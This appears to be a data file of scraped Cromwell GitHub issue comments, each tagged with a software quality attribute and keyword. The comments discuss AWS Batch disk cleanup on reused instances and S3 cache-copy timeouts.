https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718305383:303,Usability,feedback,feedback,303,"However, AWS Batch backend ignores script-epilogue as unrecognized. Do you have any suggestions?. > Yes, the script epilogue is exactly where the change should be. The script is generated by AwsBatchJob.scala; > […](#); > On Sun, Oct 25, 2020 at 8:37 PM Luyu ***@***.***> wrote: Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if there is a few minutes gap between workflows the instances will be terminated by batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to shut down the instances. Also because these files are written to a mounted disk they are not deleted when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks, Mark … <#m_-3989886626109986556_> On Sat, Oct 24, 2020 at 5:27 AM Luyu *@*.***> wrote: Hi, I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/ If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. I have checked Cromwell documents and some materials from AWS, as well as issue #4323 <#4323> <#4323 <#4323>>. But none of them works for me. Thank you in advance for any suggestions. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5974 <#5974>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA . Hi Mark, Thanks for your reply. I think I find a workaround (probabl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718305383
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718305383:546,Usability,pause,pause,546,"However, AWS Batch backend ignores script-epilogue as unrecognized. Do you have any suggestions?. > Yes, the script epilogue is exactly where the change should be. The script is generated by AwsBatchJob.scala; > […](#); > On Sun, Oct 25, 2020 at 8:37 PM Luyu ***@***.***> wrote: Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if there is a few minutes gap between workflows the instances will be terminated by batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to shut down the instances. Also because these files are written to a mounted disk they are not deleted when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks, Mark … <#m_-3989886626109986556_> On Sat, Oct 24, 2020 at 5:27 AM Luyu *@*.***> wrote: Hi, I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/ If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. I have checked Cromwell documents and some materials from AWS, as well as issue #4323 <#4323> <#4323 <#4323>>. But none of them works for me. Thank you in advance for any suggestions. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5974 <#5974>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA . Hi Mark, Thanks for your reply. I think I find a workaround (probabl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718305383
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718305383:737,Usability,simpl,simple,737,"However, AWS Batch backend ignores script-epilogue as unrecognized. Do you have any suggestions?. > Yes, the script epilogue is exactly where the change should be. The script is generated by AwsBatchJob.scala; > […](#); > On Sun, Oct 25, 2020 at 8:37 PM Luyu ***@***.***> wrote: Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if there is a few minutes gap between workflows the instances will be terminated by batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to shut down the instances. Also because these files are written to a mounted disk they are not deleted when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks, Mark … <#m_-3989886626109986556_> On Sat, Oct 24, 2020 at 5:27 AM Luyu *@*.***> wrote: Hi, I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/ If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. I have checked Cromwell documents and some materials from AWS, as well as issue #4323 <#4323> <#4323 <#4323>>. But none of them works for me. Thank you in advance for any suggestions. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5974 <#5974>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA . Hi Mark, Thanks for your reply. I think I find a workaround (probabl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718305383
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718815965:976,Availability,down,down,976,"The clean up instructions to delete the files should go in here; https://github.com/broadinstitute/cromwell/blob/bda6d9043de866b1542a58555dcb9c6070a7c7b5/supportedBackends/aws/src/main/scala/cromwell/backend/impl/aws/AwsBatchJob.scala#L164. After the delocalization happens. On Wed, Oct 28, 2020 at 9:42 PM Luyu <notifications@github.com> wrote:. > However, AWS Batch backend ignores script-epilogue as unrecognized. Do you; > have any suggestions?; >; > Yes, the script epilogue is exactly where the change should be. The script; > is generated by AwsBatchJob.scala; > … <#m_-2379693136183385899_>; > On Sun, Oct 25, 2020 at 8:37 PM Luyu *@*.*> wrote: Hi Luyu, Thanks for; > the feedback. This is an interesting case. Normally if there is a few; > minutes gap between workflows the instances will be terminated by batch and; > the disks will be reclaimed so each workflow starts from scratch. However; > in your case there isn’t a pause in work long enough for Batch to shut down; > the instances. Also because these files are written to a mounted disk they; > are not deleted when the container terminates. I think this fix is simple; > if I add a cleanup step. I will do this ASAP. Thanks, Mark …; > <#m_-3989886626109986556_> On Sat, Oct 24, 2020 at 5:27 AM Luyu @.*>; > wrote: Hi, I have set up a Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space. I have checked Cromwell documents; > and some materials from AWS, as well as",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718815965
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718815965:1467,Deployability,pipeline,pipeline,1467,"stions?; >; > Yes, the script epilogue is exactly where the change should be. The script; > is generated by AwsBatchJob.scala; > … <#m_-2379693136183385899_>; > On Sun, Oct 25, 2020 at 8:37 PM Luyu *@*.*> wrote: Hi Luyu, Thanks for; > the feedback. This is an interesting case. Normally if there is a few; > minutes gap between workflows the instances will be terminated by batch and; > the disks will be reclaimed so each workflow starts from scratch. However; > in your case there isn’t a pause in work long enough for Batch to shut down; > the instances. Also because these files are written to a mounted disk they; > are not deleted when the container terminates. I think this fix is simple; > if I add a cleanup step. I will do this ASAP. Thanks, Mark …; > <#m_-3989886626109986556_> On Sat, Oct 24, 2020 at 5:27 AM Luyu @.*>; > wrote: Hi, I have set up a Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space. I have checked Cromwell documents; > and some materials from AWS, as well as issue #4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>>>. But none of; > them works for me. Thank you in advance for any suggestions. — You are; > receiving this because you are subscribed to this thread. Reply to this; ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718815965
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718815965:1540,Deployability,pipeline,pipeline,1540," <#m_-2379693136183385899_>; > On Sun, Oct 25, 2020 at 8:37 PM Luyu *@*.*> wrote: Hi Luyu, Thanks for; > the feedback. This is an interesting case. Normally if there is a few; > minutes gap between workflows the instances will be terminated by batch and; > the disks will be reclaimed so each workflow starts from scratch. However; > in your case there isn’t a pause in work long enough for Batch to shut down; > the instances. Also because these files are written to a mounted disk they; > are not deleted when the container terminates. I think this fix is simple; > if I add a cleanup step. I will do this ASAP. Thanks, Mark …; > <#m_-3989886626109986556_> On Sat, Oct 24, 2020 at 5:27 AM Luyu @.*>; > wrote: Hi, I have set up a Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space. I have checked Cromwell documents; > and some materials from AWS, as well as issue #4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>>>. But none of; > them works for me. Thank you in advance for any suggestions. — You are; > receiving this because you are subscribed to this thread. Reply to this; > email directly, view it on GitHub <#5974; > <https://github.com/broadinstitute/cromwell/issues/5974> <#5974; > <https://github.c",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718815965
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718815965:1565,Performance,concurren,concurrently,1565," <#m_-2379693136183385899_>; > On Sun, Oct 25, 2020 at 8:37 PM Luyu *@*.*> wrote: Hi Luyu, Thanks for; > the feedback. This is an interesting case. Normally if there is a few; > minutes gap between workflows the instances will be terminated by batch and; > the disks will be reclaimed so each workflow starts from scratch. However; > in your case there isn’t a pause in work long enough for Batch to shut down; > the instances. Also because these files are written to a mounted disk they; > are not deleted when the container terminates. I think this fix is simple; > if I add a cleanup step. I will do this ASAP. Thanks, Mark …; > <#m_-3989886626109986556_> On Sat, Oct 24, 2020 at 5:27 AM Luyu @.*>; > wrote: Hi, I have set up a Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space. I have checked Cromwell documents; > and some materials from AWS, as well as issue #4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>>>. But none of; > them works for me. Thank you in advance for any suggestions. — You are; > receiving this because you are subscribed to this thread. Reply to this; > email directly, view it on GitHub <#5974; > <https://github.com/broadinstitute/cromwell/issues/5974> <#5974; > <https://github.c",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718815965
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718815965:680,Usability,feedback,feedback,680,"The clean up instructions to delete the files should go in here; https://github.com/broadinstitute/cromwell/blob/bda6d9043de866b1542a58555dcb9c6070a7c7b5/supportedBackends/aws/src/main/scala/cromwell/backend/impl/aws/AwsBatchJob.scala#L164. After the delocalization happens. On Wed, Oct 28, 2020 at 9:42 PM Luyu <notifications@github.com> wrote:. > However, AWS Batch backend ignores script-epilogue as unrecognized. Do you; > have any suggestions?; >; > Yes, the script epilogue is exactly where the change should be. The script; > is generated by AwsBatchJob.scala; > … <#m_-2379693136183385899_>; > On Sun, Oct 25, 2020 at 8:37 PM Luyu *@*.*> wrote: Hi Luyu, Thanks for; > the feedback. This is an interesting case. Normally if there is a few; > minutes gap between workflows the instances will be terminated by batch and; > the disks will be reclaimed so each workflow starts from scratch. However; > in your case there isn’t a pause in work long enough for Batch to shut down; > the instances. Also because these files are written to a mounted disk they; > are not deleted when the container terminates. I think this fix is simple; > if I add a cleanup step. I will do this ASAP. Thanks, Mark …; > <#m_-3989886626109986556_> On Sat, Oct 24, 2020 at 5:27 AM Luyu @.*>; > wrote: Hi, I have set up a Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space. I have checked Cromwell documents; > and some materials from AWS, as well as",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718815965
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718815965:932,Usability,pause,pause,932,"The clean up instructions to delete the files should go in here; https://github.com/broadinstitute/cromwell/blob/bda6d9043de866b1542a58555dcb9c6070a7c7b5/supportedBackends/aws/src/main/scala/cromwell/backend/impl/aws/AwsBatchJob.scala#L164. After the delocalization happens. On Wed, Oct 28, 2020 at 9:42 PM Luyu <notifications@github.com> wrote:. > However, AWS Batch backend ignores script-epilogue as unrecognized. Do you; > have any suggestions?; >; > Yes, the script epilogue is exactly where the change should be. The script; > is generated by AwsBatchJob.scala; > … <#m_-2379693136183385899_>; > On Sun, Oct 25, 2020 at 8:37 PM Luyu *@*.*> wrote: Hi Luyu, Thanks for; > the feedback. This is an interesting case. Normally if there is a few; > minutes gap between workflows the instances will be terminated by batch and; > the disks will be reclaimed so each workflow starts from scratch. However; > in your case there isn’t a pause in work long enough for Batch to shut down; > the instances. Also because these files are written to a mounted disk they; > are not deleted when the container terminates. I think this fix is simple; > if I add a cleanup step. I will do this ASAP. Thanks, Mark …; > <#m_-3989886626109986556_> On Sat, Oct 24, 2020 at 5:27 AM Luyu @.*>; > wrote: Hi, I have set up a Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space. I have checked Cromwell documents; > and some materials from AWS, as well as",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718815965
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718815965:1129,Usability,simpl,simple,1129,"555dcb9c6070a7c7b5/supportedBackends/aws/src/main/scala/cromwell/backend/impl/aws/AwsBatchJob.scala#L164. After the delocalization happens. On Wed, Oct 28, 2020 at 9:42 PM Luyu <notifications@github.com> wrote:. > However, AWS Batch backend ignores script-epilogue as unrecognized. Do you; > have any suggestions?; >; > Yes, the script epilogue is exactly where the change should be. The script; > is generated by AwsBatchJob.scala; > … <#m_-2379693136183385899_>; > On Sun, Oct 25, 2020 at 8:37 PM Luyu *@*.*> wrote: Hi Luyu, Thanks for; > the feedback. This is an interesting case. Normally if there is a few; > minutes gap between workflows the instances will be terminated by batch and; > the disks will be reclaimed so each workflow starts from scratch. However; > in your case there isn’t a pause in work long enough for Batch to shut down; > the instances. Also because these files are written to a mounted disk they; > are not deleted when the container terminates. I think this fix is simple; > if I add a cleanup step. I will do this ASAP. Thanks, Mark …; > <#m_-3989886626109986556_> On Sat, Oct 24, 2020 at 5:27 AM Luyu @.*>; > wrote: Hi, I have set up a Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space. I have checked Cromwell documents; > and some materials from AWS, as well as issue #4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718815965
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:855,Availability,Error,Error,855,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:872,Availability,Failure,Failure,872,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:23,Deployability,update,updated,23,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:251,Deployability,release,release,251,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:325,Deployability,configurat,configuration,325,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:409,Deployability,Install,Installing,409,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > 